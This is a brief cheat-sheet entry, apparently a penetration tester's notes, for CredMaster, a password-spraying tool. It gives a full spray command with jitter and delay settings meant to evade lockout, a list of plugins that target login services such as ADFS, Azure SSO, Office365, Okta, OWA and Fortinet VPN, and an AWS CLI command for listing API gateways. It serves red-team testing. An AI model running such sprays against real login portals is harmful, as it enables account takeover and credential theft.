### Source
https://github.com/knavesec/CredMaster

### Start password spray (-t threads, -m minimum jitter seconds, -j jitter, -d minute delay between pws)
```
python3 credmaster.py --access_key <key> --secret_access_key "<secret>" --plugin <plugin> --url "https://<domain>" -u <userList> -p <passwordList> -a <useragentList> -o <outFile> --region <region> --passwordsperdelay 1 -t 1 -m 30 -j 60 -d 180
```

### Plugins
```
ADFS - Active Directory Federation Services
AzureSSO - Azure AD Seamless SSO Endpoint
AzVault - AzVault Module, Azure spray point different to MSOL/AzureSSO
EWS - Exchange Web Services
FortinetVPN - Fortinet VPN Client
HTTPBrute - Generic HTTP Brute Methods (Basic/Digest/NTLM)
MSGraph - MSGraph Module, msgraph spray point for azure and MSOL credentials
MSOL - Microsoft Online
O365Enum - Office365 User Enum (No Authentication Request)
O365 - Office365 - DEPRECATED
Okta - Okta Authentication Portal
OWA - Outlook Web Access
```

### Get aws api gateways
```
aws apigateway --region <region> get-rest-apis | jq -r '.items[] | .id, .name, (.createdDate | todate)'
```

